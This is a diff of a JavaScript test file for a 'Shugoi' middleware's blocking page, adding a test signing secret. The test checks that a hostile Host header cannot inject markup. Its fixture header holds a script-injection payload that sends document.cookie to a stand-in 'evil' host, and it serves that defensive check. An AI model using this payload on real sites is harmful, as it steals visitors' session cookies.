@@ -26,7 +26,7 @@ describe("page de blocage", () => {
 
   it("un Host hostile n'introduit pas de balise", async () => {
     const { createShugoiMiddleware } = await import("../src/middleware");
-    const mw = createShugoiMiddleware({ siteKey: 'sg_sk_live_t', verifyBots: false });
+    const mw = createShugoiMiddleware({ siteKey: 'sg_sk_live_t', signingSecret: 'test-secret-32bytes-long!', verifyBots: false });
     const { req, res } = (() => {
       const r = {
         headers: { 'user-agent': 'curl/8.0.0', host: 'x"><script>fetch("//evil/"+document.cookie)</script>' },
